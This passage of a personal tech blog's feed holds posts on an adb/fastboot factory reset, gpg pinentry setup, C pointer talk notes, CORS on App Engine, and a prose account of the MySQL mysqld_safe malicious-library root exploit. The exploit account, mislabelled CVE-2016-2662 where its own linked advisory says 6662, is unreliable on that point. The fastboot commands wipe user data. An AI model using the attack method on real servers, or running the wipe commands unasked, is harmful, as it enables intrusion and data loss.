&lt;/ul&gt;</summary><category term="Chrome"></category><category term="Chromium"></category><category term="Chromecast"></category><category term="VLC"></category><category term="SMPlayer"></category></entry><entry><title>Factory Reset Android via ADB</title><link href="https://blog.m157q.tw/posts/2017/05/05/factory-reset-android-via-adb/" rel="alternate"></link><published>2017-05-05T01:33:34+08:00</published><updated>2017-05-05T01:33:34+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-05-05:posts/2017/05/05/factory-reset-android-via-adb/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;Factory Reset from the GUI settings of my ASUS ZenFone 2 (ZE551ML) with CynagenMod 14 installed didn't work.  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Steps&lt;/h2&gt;
&lt;p&gt;Before doing this:  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Make sure your computer had already installed &lt;code&gt;adb&lt;/code&gt;.  &lt;ul&gt;
&lt;li&gt;For Arch Linux users: &lt;code&gt;$ sudo pacman -S android-tools&lt;/code&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Make sure your Android phone had already enable the &lt;code&gt;Developer Options&lt;/code&gt; and enable the USB Debugging via ADB.  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Let's go:  &lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;Connect your Android phone to your computer.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ adb devices&lt;/code&gt; make sure your phone is listed.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ adb reboot bootloader&lt;/code&gt; to reboot the Android to bootloader.  &lt;/li&gt;
&lt;li&gt;Wait until it reboot to bootloader.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo fastboot erase userdata&lt;/code&gt; to wipe all user data.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo fastboot erase cache&lt;/code&gt; to wipe all cache.  &lt;/li&gt;
&lt;li&gt;&lt;code&gt;$ sudo fastboot reboot&lt;/code&gt; to reboot your phone.  &lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;And that's it, it works for me.  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ adb --version  
Android Debug Bridge version &lt;span class="m"&gt;1&lt;/span&gt;.0.36  
Revision &lt;span class="m"&gt;7&lt;/span&gt;.1.2_r6  
&lt;/pre&gt;&lt;/div&gt;</summary><category term="android"></category><category term="adb"></category><category term="factory reset"></category></entry><entry><title>讓 gpg-agent 在 git commit gpg-sign 時使用 pinentry-curses</title><link href="https://blog.m157q.tw/posts/2017/01/20/make-gpg-agent-use-pinentry-curses-while-git-commit-gpg-sign/" rel="alternate"></link><published>2017-01-20T13:21:09+08:00</published><updated>2017-01-20T13:21:09+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2017-01-20:posts/2017/01/20/make-gpg-agent-use-pinentry-curses-while-git-commit-gpg-sign/</id><summary type="html">&lt;h2&gt;前言&lt;/h2&gt;
&lt;p&gt;git 使用 gpg sign 預設的 gpg-agent 會是 pinentry-gtk2&lt;br /&gt;
最近把 Arch Linux 筆電升上 Linux 4.8.13 後&lt;br /&gt;
X server 好像有 Buffer Overflow 還是 Garbage collection 沒做好的問題&lt;br /&gt;
跑一陣子就會跳掉&lt;br /&gt;
重新 &lt;code&gt;startx&lt;/code&gt; 還是可以動&lt;br /&gt;
但會抓不到 x window 的 output 變數&lt;br /&gt;
導致 git commit 在作 gpg sign 時&lt;br /&gt;
叫不出 &lt;code&gt;pinentry-gtk2&lt;/code&gt; 所以無法輸入 passpharse&lt;br /&gt;
直接噴  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;error&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;gpg&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;sign&lt;/span&gt; &lt;span class="n"&gt;the&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;  
&lt;span class="n"&gt;fatal&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="n"&gt;failed&lt;/span&gt; &lt;span class="n"&gt;to&lt;/span&gt; &lt;span class="n"&gt;write&lt;/span&gt; &lt;span class="n"&gt;commit&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;所以就想說找找看有沒有可以在 terminal 裏面就解決&lt;br /&gt;
不用開 gtk 的方法&lt;br /&gt;
嗯 果然是有的  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;解法&lt;/h2&gt;
&lt;h3&gt;設定檔&lt;/h3&gt;
&lt;p&gt;在 &lt;code&gt;~/.gnupg/gpg-agent.conf&lt;/code&gt;&lt;br /&gt;
（沒有這個 conf 的話就建一個，記得要 chmod 一下）  &lt;/p&gt;
&lt;p&gt;加入一行&lt;br /&gt;
&lt;code&gt;pinentry-program /usr/bin/pinentry-curses&lt;/code&gt;&lt;br /&gt;
（記得確認 &lt;code&gt;pinentry-curses&lt;/code&gt; 已經安裝且路徑正確，否則請安裝並自行修改到正確路徑）  &lt;/p&gt;
&lt;h3&gt;重新載入&lt;/h3&gt;
&lt;p&gt;之後讓 gpg-agent 重新載入，使用新的 pinentry-program&lt;br /&gt;
&lt;code&gt;gpg-connect-agent reloadagent /bye&lt;/code&gt;  &lt;/p&gt;
&lt;h3&gt;設定變數&lt;/h3&gt;
&lt;p&gt;然後因為 &lt;code&gt;pinentry-curses&lt;/code&gt; 會需要用到 &lt;code&gt;$GPG_TTY&lt;/code&gt; 這個變數&lt;br /&gt;
所以請在自己使用的 .shellrc 裡頭加入  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;# Set GPG_TTY for pinentry-curses  
export GPG_TTY=$(tty)  
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;打完收工&lt;/h3&gt;
&lt;p&gt;沒意外的話這樣就行了&lt;br /&gt;
在原本的 shell 重新 source 一次修改好的 rc 檔&lt;br /&gt;
或是直接開啟一個新的 shell&lt;br /&gt;
確認有 &lt;code&gt;GPG_TTY&lt;/code&gt; 這個參數&lt;br /&gt;
之後用 git commit 在做 gpg sign 的時候&lt;br /&gt;
就可以直接在 terminal 裏面打 passphrase 了&lt;br /&gt;
不需要用到 GTK 和 X window 啦  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Reference&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="https://wiki.archlinux.org/index.php/GnuPG#Configuration_2"&gt;GnuPG - ArchWiki&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="cli"></category><category term="gpg"></category><category term="pinentry"></category><category term="git"></category></entry><entry><title>CVE-2016-2662</title><link href="https://blog.m157q.tw/posts/2016/09/19/cve-2016-2662/" rel="alternate"></link><published>2016-09-19T17:46:28+08:00</published><updated>2016-09-19T17:46:28+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-19:posts/2016/09/19/cve-2016-2662/</id><summary type="html">&lt;h2&gt;Preface&lt;/h2&gt;
&lt;p&gt;接近第一時間的時候稍微追了一下漏洞的 PoC，&lt;br /&gt;
雖然離事件發生也隔了好幾天了，&lt;br /&gt;
還是整理成一篇文章紀錄一下，&lt;br /&gt;
畢竟應該是今年最大的漏洞了吧？  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;p&gt;漏洞的詳細細節都在以下這個文件：&lt;br /&gt;
&lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html&lt;/a&gt;&lt;br /&gt;
以下稍微紀錄之前追的時候看到的東西  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="summary for CVE 2016-2662" src="/files/cve-2016-2662/1.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;這邊可以看到 MySQL 全部的版本都中獎了，&lt;br /&gt;
然後連 MariaDB 跟 PerconaDB 也中獎。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="PoC of CVE 2016-2662" src="/files/cve-2016-2662/2.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;從 PoC 可以看到，&lt;br /&gt;
是透過 &lt;code&gt;mysqld_safe&lt;/code&gt; 這個 wrapper script 來作為攻擊點。  &lt;/p&gt;
&lt;p&gt;即便 &lt;code&gt;mysqld&lt;/code&gt; 不是以 &lt;code&gt;root&lt;/code&gt; 的權限執行，&lt;br /&gt;
&lt;code&gt;MySQL&lt;/code&gt; 預設仍會讓 &lt;code&gt;mysqld_safe&lt;/code&gt; 這個 wrapper script 以 &lt;code&gt;root&lt;/code&gt; 的權限執行。&lt;br /&gt;
然後 &lt;code&gt;mysqld_safe&lt;/code&gt; 裡頭有個 &lt;code&gt;set_malloc_lib&lt;/code&gt; 的 function 可以用來 preload shared library，&lt;br /&gt;
至於要 preload 什麼 shared library 可以透過執行 &lt;code&gt;mysqld&lt;/code&gt; 時加入 &lt;code&gt;--malloc-lib=$LIB&lt;/code&gt;&lt;br /&gt;
或是在 &lt;code&gt;my.cnf&lt;/code&gt; 的 &lt;code&gt;mysqld&lt;/code&gt; 或 &lt;code&gt;mysqld_safe&lt;/code&gt; 的 section 中指定路徑。  &lt;/p&gt;
&lt;p&gt;如果攻擊者將惡意的 shared library 上傳到目標伺服器，&lt;br /&gt;
然後再將 &lt;code&gt;my.cnf&lt;/code&gt; 中的 preload library 路徑改到該惡意的 shared library 的路徑，&lt;br /&gt;
則目標伺服器下次重新啟動 &lt;code&gt;mysql&lt;/code&gt; 的時候，&lt;br /&gt;
就會載入該惡意的 shared library，&lt;br /&gt;
讓攻擊者達到執行任意程式碼的攻擊，&lt;br /&gt;
而且是以 root 的身份執行，&lt;br /&gt;
因為是由 &lt;code&gt;mysqld_safe&lt;/code&gt; load 進來的。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;img alt="Status of CVE 2016-2662" src="/files/cve-2016-2662/3.jpg" /&gt;  &lt;/p&gt;
&lt;p&gt;今年 7 月 29 日通報 Oracle、MariaDB、PerconaDB。&lt;br /&gt;
後兩者已於今年 8 月 30 日修補漏洞，新的版本中不會有此漏洞。（所以我說 Oracle 呢？）  &lt;/p&gt;
&lt;p&gt;目前仍然沒有官方補丁可用。&lt;br /&gt;
一旦有補丁釋出，使用者應該儘快更新。  &lt;/p&gt;
&lt;p&gt;暫時的解法是確認 &lt;code&gt;mysql&lt;/code&gt; 這個 user 沒有任何 MySQL 的設定檔的 owner 權限，&lt;br /&gt;
然後建立一個只有 &lt;code&gt;root&lt;/code&gt; 有 owner 權限的 &lt;code&gt;my.cnf&lt;/code&gt; 的備份檔，&lt;br /&gt;
這部份應該就是在 &lt;code&gt;my.cnf&lt;/code&gt; 真的被改掉的話，可以回復回來。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;&lt;a href="https://thehackernews.com/2016/09/hack-mysql-database.html"&gt;似乎還有一個 0-day CVE-2016-2663 不過好像還沒公佈細節&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;覺得整個攻擊的手法挺有趣的，&lt;br /&gt;
概念不難理解，&lt;br /&gt;
但可行性因為必須先注入惡意的 shared library 還要把 &lt;code&gt;my.cnf&lt;/code&gt; 的 &lt;code&gt;lib&lt;/code&gt; 路徑改掉，&lt;br /&gt;
然後還要重新啟動才會生效而大大降低，&lt;br /&gt;
反而平常沒在更新就不需要重啟的 MySQL server 不會出事。&lt;br /&gt;
但可行性低不代表不會發生，&lt;br /&gt;
個人覺得可能會出現在 APT 那種針對性的攻擊吧。  &lt;/p&gt;
&lt;hr /&gt;
&lt;p&gt;丟在 gist 上備份一下 &lt;a href="https://gist.github.com/M157q/a3c14b99905f3d3704b2477fb47cd33a"&gt;https://gist.github.com/M157q/a3c14b99905f3d3704b2477fb47cd33a&lt;/a&gt;  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Related Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html"&gt;http://legalhackers.com/advisories/MySQL-Exploit-Remote-Root-Code-Execution-Privesc-CVE-2016-6662.html&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://blog.gslin.org/archives/2016/09/13/6832/mysql-%E5%85%A8%E7%B3%BB%E5%88%97%E7%9A%84%E5%AE%89%E5%85%A8%E6%80%A7%E6%BC%8F%E6%B4%9E/"&gt;MySQL 全系列的安全性漏洞 | Gea-Suan Lin's BLOG&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://www.percona.com/blog/2016/09/12/percona-server-critical-update-cve-2016-6662/"&gt;Percona Server Critical Update CVE-2016-6662 - Percona Database Performance Blog&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;&lt;a href="https://thehackernews.com/2016/09/hack-mysql-database.html"&gt;New MySQL Zero Days — Hacking Website Databases&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="Security"></category><category term="MySQL"></category><category term="CVE"></category><category term="0day"></category><category term="Remote Code Execution"></category></entry><entry><title>20160918 - 你所不知道的 C 語言：指標篇 復刻！</title><link href="https://blog.m157q.tw/posts/2016/09/18/guts-c-pointers/" rel="alternate"></link><published>2016-09-20T01:17:00+08:00</published><updated>2016-09-20T01:17:00+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-18:posts/2016/09/18/guts-c-pointers/</id><summary type="html">&lt;p&gt;這篇嚴格來說不算筆記，&lt;br /&gt;
大概只算 jserv 語錄 （？）&lt;br /&gt;
想真的瞭解內容的話還是得看共筆就是。  &lt;/p&gt;
&lt;p&gt;從晚上九點才開始聽，&lt;br /&gt;
而且一開始在是剛到臺北下統聯後，&lt;br /&gt;
在要回租屋處的捷運上邊搭邊聽的，&lt;br /&gt;
所以其實無法太詳細紀錄。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Links&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;影片：&lt;a href="https://www.youtube.com/watch?v=Eiu2Le-xjmg"&gt;https://www.youtube.com/watch?v=Eiu2Le-xjmg&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;共筆：&lt;a href="http://hackfoldr.org/dykc/s0rlzR8wVtm"&gt;http://hackfoldr.org/dykc/s0rlzR8wVtm&lt;/a&gt;  &lt;/li&gt;
&lt;li&gt;聊天室：&lt;a href="https://gitter.im/embedded2015/guts-general"&gt;https://gitter.im/embedded2015/guts-general&lt;/a&gt;  &lt;/li&gt;
&lt;/ul&gt;
&lt;hr /&gt;
&lt;h2&gt;Note&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;「我去天瓏書店翻書的時候，看到有些書提到『雙指標』，但其實根本沒有雙指標這種東西，只有『指標的指標』，這兩個是完全不同的東西，就像『雙馬尾』跟『馬尾的馬尾』是完全不同的東西，所以拜託看到有『雙指標』的 C 語言的書就不要買了。」  &lt;/li&gt;
&lt;li&gt;「要看懂 C 語言的規格書，你得先會微積分。所以微積分很重要的，趕快去複習一下。」(註：Function Designator 的部份)  &lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;// 這句應該是指 function designator 的這種狀況  &lt;/span&gt;

&lt;span class="kt"&gt;int&lt;/span&gt; &lt;span class="nf"&gt;main&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;  
    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="o"&gt;********&lt;/span&gt;&lt;span class="n"&gt;puts&lt;/span&gt;&lt;span class="p"&gt;)(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Hello&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;  
&lt;span class="p"&gt;}&lt;/span&gt;  

&lt;span class="c1"&gt;// 不管有幾個 * 結果都一樣  &lt;/span&gt;
&lt;span class="c1"&gt;// 就像 e^x 對 x 微分不管微幾次結果都是 e^x  &lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;「Function Designator 的 Designator 不要唸成跟 Design 一樣，它的 i 是短音的。」  &lt;ul&gt;
&lt;li&gt;附上音標  &lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;$ zdict designator  
designator  
KK&lt;span class="o"&gt;[&lt;/span&gt;͵dɛzɪgˋnetɚ&lt;span class="o"&gt;]&lt;/span&gt; DJ&lt;span class="o"&gt;[&lt;/span&gt;͵dezigˋneitə&lt;span class="o"&gt;]&lt;/span&gt;  
n.名詞  
  &lt;span class="m"&gt;1&lt;/span&gt;. 指示者；指定者  
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;「lvalue 和 rvalue 是很複雜的東西，不是只有在等號左邊或等號右邊的意思，今天時間不夠，所以我不想跟你講。」  &lt;/li&gt;
&lt;li&gt;「很多人都以為字串很簡單，但不對，自從 C99 以後，字串非常複雜。」  &lt;/li&gt;
&lt;li&gt;「世界上有個很神奇的 Compiler 叫作 Microsoft C compiler，他不支援直接使用 UTF-8。」  &lt;/li&gt;
&lt;li&gt;「C 的 Array 只是 Pointer 的 syntax sugar，但寫法並不是所有情況都可以互換，只有當作 function definition 的 parameter 時可以互換。如果是 extern 的時候換成 pointer 方式的寫法的話，產生出來的組合語言是完全不一樣的，這件事說來慚愧，我是寫了程式 10 年以後才知道的，是某次在處理 JVM 的程式碼的時候發現的。」  &lt;/li&gt;
&lt;li&gt;「C 其實沒有 Array 這個東西，真正的名字是 Array Subscripting，它只是一種 pointer 的表示法。」  &lt;/li&gt;
&lt;li&gt;「你之所以看不懂 Linux Kernel，往往不是因為 Linux Kernel 很複雜，而是你不懂 C 語言。」  &lt;/li&gt;
&lt;li&gt;「在 C99，有個很麻煩的東西叫 lvalue，l 不是 left，不是在等號左邊的意思，而是 object locator, l 是 locator 的意思。然後這在 C++ 裏面又被重新定義了，這又是另外一回事了。」  &lt;/li&gt;
&lt;li&gt;「C 從 1972 被發明出來開始是沒有 float 的，只有 double，float 在 1985 的 IEEE754 制定時才出現，然後在 1989 年才確定。」  &lt;/li&gt;
&lt;li&gt;「C 和 C++ 在 1999 年以後就兵分兩路了，雖然他們還是有共同的地方，但請把他們兩個當作不同的語言來學。」  &lt;/li&gt;
&lt;li&gt;「如果你貿然得想從 Linux Kernel 去學習作業系統和 C 語言的話，往往會吃很大的虧，因為 Linux Kernel 用到了很多 C 語言的東西，而且還用到了不少 Undefined Behavior。」  &lt;/li&gt;
&lt;li&gt;和作業系統相關概念的共筆：&lt;a href="http://hackfoldr.org/oscar"&gt;http://hackfoldr.org/oscar&lt;/a&gt;。  &lt;/li&gt;
&lt;li&gt;歡迎訂閱這個粉絲專頁 &lt;a href="https://www.facebook.com/JservFans/"&gt;https://www.facebook.com/JservFans/&lt;/a&gt; 會不時的分享一些和 Open Source 有關的消息。  &lt;/li&gt;
&lt;/ul&gt;</summary><category term="C"></category><category term="GUTS"></category><category term="jserv"></category><category term="pointers"></category></entry><entry><title>紀錄一下和 CORS (Cross-Origin Resource Sharing) 有關的問題</title><link href="https://blog.m157q.tw/posts/2016/09/07/cross-origin-resource-sharing/" rel="alternate"></link><published>2016-09-07T23:22:28+08:00</published><updated>2016-09-07T23:22:28+08:00</updated><author><name>m157q</name></author><id>tag:blog.m157q.tw,2016-09-07:posts/2016/09/07/cross-origin-resource-sharing/</id><summary type="html">&lt;h2&gt;Situation&lt;/h2&gt;
&lt;p&gt;錯誤訊息長的像下面這樣  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;Font from origin &amp;#39;http://cdn.xxx.xxx&amp;#39;  
has been blocked from loading by Cross-Origin Resource Sharing policy:  
No &amp;#39;Access-Control-Allow-Origin&amp;#39; header is present on the requested resource.  
Origin &amp;#39;http://ooo.xxx.xxx&amp;#39; is therefore not allowed access.  
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;這是以前沒遇過的問題，&lt;br /&gt;
所以尋找了一下答案，&lt;br /&gt;
紀錄起來，&lt;br /&gt;
給自己備忘。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;What is CORS?&lt;/h2&gt;
&lt;h3&gt;CORS is the abbreviation of "Cross-Origin Resource Sharing".&lt;/h3&gt;
&lt;h4&gt;1. &lt;a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Access_control_CORS#Access-Control-Allow-Origin"&gt;HTTP access control (CORS) - HTTP | MDN&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;For security reasons, browsers restrict cross-origin HTTP requests initiated from within scripts. For example, XMLHttpRequest follows the same-origin policy. So, a web application using XMLHttpRequest could only make HTTP requests to its own domain. To improve web applications, developers asked browser vendors to allow XMLHttpRequest to make cross-domain requests.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The W3C Web Applications Working Group recommends the new Cross-Origin Resource Sharing (CORS) mechanism. CORS gives web servers cross-domain access controls, which enable secure cross-domain data transfers. Modern browsers use CORS in an API container - such as XMLHttpRequest - to mitigate risks of cross-origin HTTP requests.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;簡單來說就是 XMLHttpRequest 因為安全性的考量只允許相同域名的請求，&lt;br /&gt;
如果要請求跨域名的物件的話，&lt;br /&gt;
就必須請目標域名的管理者把自己加到該目標域名網站的 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 的 HTTP Header 中，&lt;br /&gt;
而 CORS 就是為了解決這件事而出現。  &lt;/p&gt;
&lt;h4&gt;2. &lt;a href="https://cloud.google.com/storage/docs/cross-origin#client_side_support"&gt;Cross-Origin Resource Sharing (CORS) | Cloud Storage | Google Cloud Platform&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The same-origin policy is a security policy enforced on client-side web apps (e.g., web browsers) to prevent interactions between resources from different origins. While useful for preventing malicious behavior, this security measure also prevents useful and legitimate interactions between known origins. For example, a script on a page hosted from Google App Engine at example.appspot.com might want to use static resources stored in a Cloud Storage bucket at example.storage.googleapis.com. However, because these are two different origins from the perspective of the browser, the browser won't allow a script from example.appspot.com to fetch resources from example.storage.googleapis.com using XMLHttpRequest because the resource being fetched is from a different origin.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;The Cross Origin Resource Sharing (CORS) spec was developed by the World Wide Web Consortium (W3C) to get around this limitation.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;大意其實跟上面那段差不多。  &lt;/p&gt;
&lt;h4&gt;3. &lt;a href="https://www.w3.org/TR/cors/"&gt;Cross-Origin Resource Sharing&lt;/a&gt;&lt;/h4&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;This document defines a mechanism to enable client-side cross-origin requests. Specifications that enable an API to make cross-origin requests to resources can use the algorithms defined by this specification. If such an API is used on http://example.org resources, a resource on http://hello-world.example can opt in using the mechanism described by this specification (e.g., specifying Access-Control-Allow-Origin: http://example.org as response header), which would allow that resource to be fetched cross-origin from http://example.org.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;5.1 Access-Control-Allow-Origin Response Header&lt;br /&gt;
The Access-Control-Allow-Origin header indicates whether a resource can be shared based by returning the value of the Origin request header, "*", or "null" in the response. ABNF:&lt;br /&gt;
&lt;code&gt;Access-Control-Allow-Origin = "Access-Control-Allow-Origin" ":" origin-list-or-null | "\*"&lt;/code&gt;&lt;br /&gt;
Note: In practice the origin-list-or-null production is more constrained. Rather than allowing a space-separated list of origins, it is either a single origin or the string "null".  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;所以直接從文件看來，&lt;br /&gt;
W3C 當初設計上其實是允許多個 domain 的，&lt;br /&gt;
只要以空白分隔就行。&lt;br /&gt;
但 Note 的部份就提到了一個重點，&lt;br /&gt;
實作上通常只允許單一 domain 或是 &lt;code&gt;"*"&lt;/code&gt; 而已，&lt;br /&gt;
不允許用空白分隔多個 domain 形成的 origin-list，&lt;br /&gt;
這個原因我也不懂，&lt;br /&gt;
但造成我不小的問題就是。  &lt;/p&gt;
&lt;hr /&gt;
&lt;h2&gt;Solution of Google App Engine for CORS&lt;/h2&gt;
&lt;h3&gt;&lt;a href="https://cloud.google.com/appengine/docs/python/config/appref"&gt;app.yaml Reference | App Engine standard environment for Python | Google Cloud Platform&lt;/a&gt;&lt;/h3&gt;
&lt;blockquote&gt;
&lt;p&gt;CORS Support  &lt;/p&gt;
&lt;p&gt;One important use of this feature is to support cross-origin resource sharing (CORS), such as accessing files hosted by another App Engine app.  &lt;/p&gt;
&lt;p&gt;For example, you could have a game app mygame.appspot.com that accesses assets hosted by myassets.appspot.com. However, if mygame attempts to make a JavaScript XMLHttpRequest to myassets, it will not succeed unless the handler for myassets returns an Access-Control-Allow-Origin: response header containing the value http://mygame.appspot.com.  &lt;/p&gt;
&lt;p&gt;Here is how you would make your static file handler return that required response header value:  &lt;/p&gt;
&lt;p&gt;&lt;code&gt;handlers:  
- url: /images  
  static_dir: static/images  
  http_headers:  
    Access-Control-Allow-Origin: http://mygame.appspot.com&lt;/code&gt;&lt;br /&gt;
Note: if you wanted to allow everyone to access your assets, you could use the wildcard '*', instead of http://mygame.appspot.com.  &lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;這邊並沒有提到能不能使用空白分隔的 origin-list，&lt;br /&gt;
但我記得我試過，&lt;br /&gt;
結果是不行的，&lt;br /&gt;
所以後來我採用下面的解法，&lt;br /&gt;
仍然是只能設定成 &lt;code&gt;"*"&lt;/code&gt;  &lt;/p&gt;
&lt;p&gt;在 &lt;code&gt;app.yaml&lt;/code&gt; 中，&lt;br /&gt;
針對 static files 的 handler 加上 &lt;code&gt;http_headers&lt;/code&gt;，&lt;br /&gt;
並在其中加入 &lt;code&gt;Access-Control-Allow-Origin: "*"&lt;/code&gt;，&lt;br /&gt;
讓所有其他 domain 的 script 都可以 request 這些 static files (assets)。  &lt;/p&gt;
&lt;p&gt;改完之後的 &lt;code&gt;app.yaml&lt;/code&gt; 其中部份會長得像是這樣：  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt; &lt;span class="p p-Indicator"&gt;-&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;url&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;/(.*)$&lt;/span&gt;  
   &lt;span class="l l-Scalar l-Scalar-Plain"&gt;static_files&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;static/\1&lt;/span&gt;  
   &lt;span class="l l-Scalar l-Scalar-Plain"&gt;upload&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="l l-Scalar l-Scalar-Plain"&gt;static/.*$&lt;/span&gt;  
   &lt;span class="l l-Scalar l-Scalar-Plain"&gt;http_headers&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt;  
      &lt;span class="l l-Scalar l-Scalar-Plain"&gt;Access-Control-Allow-Origin&lt;/span&gt;&lt;span class="p p-Indicator"&gt;:&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;*&amp;quot;&lt;/span&gt;  
&lt;/pre&gt;&lt;/div&gt;


&lt;hr /&gt;
&lt;h2&gt;Questions&lt;/h2&gt;
&lt;p&gt;顯然把 allow domain 設定成 &lt;code&gt;"*"&lt;/code&gt; 允許所有其他 domain 不是件好事，&lt;br /&gt;
理想上當然是只允許 subdomain 就好，&lt;br /&gt;
但我在找尋相關解法的時候沒有找到這樣的用法。&lt;br /&gt;
看到的解答都是 &lt;code&gt;Access-Control-Allow-Origin&lt;/code&gt; 只能允許使用一個寫死的 domain 或是 &lt;code&gt;"*"&lt;/code&gt;。  &lt;/p&gt;
&lt;p&gt;Apache 和 Nginx 都可以針對這個部份做設定，&lt;br /&gt;
例如這兩篇都有提到作法：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://rustyrazorblade.com/2013/10/cors-with-wildcard-subdomains-using-nginx/"&gt;CORS with Wildcard Subdomains Using Nginx — Rustyrazorblade&lt;/a&gt;  &lt;/li&gt;
